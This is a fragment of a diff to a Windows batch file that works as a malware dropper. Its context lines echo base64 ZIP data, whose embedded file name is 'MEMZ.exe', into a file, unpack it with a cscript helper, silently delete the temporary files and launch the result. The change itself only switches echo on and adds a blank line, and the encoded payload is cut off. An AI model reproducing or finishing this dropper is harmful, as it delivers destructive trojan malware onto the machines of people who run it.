@@ -1,4 +1,4 @@
-@echo off
+@echo on
 
 echo UEsDBBQAAAAIAIx46kjizcik+BYAAAAyAAAIAAAATUVNWi5leGXtWnt0XMV5Hz3sCCNba6Klgjjk>x
 echo AnJkWD3uvmQ9rLCytLINkr3WypLBlu2r3bvau7p77+Y+JMvYxiDMQV2UcloSoMenAey2bkoS0hJq>>x
@@ -119,4 +119,5 @@ cscript x.js >NUL 2>NUL
 del x.js >NUL 2>NUL
 del z.zip >NUL 2>NUL
 del x >NUL 2>NUL
+
 start "" %v%
